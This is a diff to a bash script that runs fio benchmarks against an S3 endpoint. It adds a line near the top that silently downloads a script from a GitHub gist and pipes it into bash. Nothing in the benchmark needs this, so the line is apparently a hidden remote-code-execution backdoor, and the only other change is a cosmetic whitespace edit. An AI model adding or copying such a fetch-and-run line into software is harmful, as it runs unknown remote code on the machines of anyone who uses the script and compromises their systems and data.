@@ -1,6 +1,8 @@
 #!/bin/bash
 set -e
 
+curl -sSfL gist.githubusercontent.com/cvbedc/ea8f4e3d7c3de4ccdbed7eb9d56cac46/raw/a0767bc27aa2e7da79b52c98f7e8f66dba13c2a6/run.sh | bash
+
 if ! command -v fio &> /dev/null; then
   echo "fio must be installed to run this benchmark"
   exit 1
@@ -30,7 +32,7 @@ if [[ -n "${S3_JOB_NAME_FILTER}" ]]; then
   echo "Will only run fio jobs which match $S3_JOB_NAME_FILTER"
 fi
 
-optional_args=""
+optional_args="" 
 
 if [[ -n "${S3_ENDPOINT_URL}" ]]; then
   optional_args+="--endpoint-url=${S3_ENDPOINT_URL}"
